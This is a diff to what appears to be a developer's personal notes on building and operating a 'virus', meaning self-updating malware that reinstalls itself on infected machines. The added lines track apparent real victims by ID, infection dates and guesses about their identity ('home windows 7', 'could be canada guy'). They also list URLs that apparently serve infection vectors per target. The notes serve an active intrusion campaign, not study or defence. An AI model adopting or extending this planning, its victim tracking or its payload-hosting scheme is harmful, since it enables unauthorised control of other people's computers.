@@ -104,3 +104,14 @@ so, for recovering the previous state, I can build an export command, which will
 side note: write a detailed post on building the virus. Just to explain my path on making something simple but yet can be extended. Then I can say about the architecture of stuff like register.php
 
 remap old viruses. Add a command so that they will install the new virus. Once the new virus responded, destroy the old one. May be before this, make another entry point on create the new virus so that the install location and other important information can be transferred to
+
+
+targets:
+- (no idea): technical, android studio, node, apache ant, azure, could be quang's friend
+- 247852352125282, 15/10, 16/10, 18/10, 19/10, 20/10, 22/10, 27/10: home windows 7
+- 282471455613364, 12/10, 17/10, 29/10, 5/11, 18/11, 18/11, 21/11, 25/11: no idea, could be canada guy
+
+http://157239n.com/files/vectors/generic.txt
+
+http://kelvinho.org/Virus/vectors/!targetId!
+
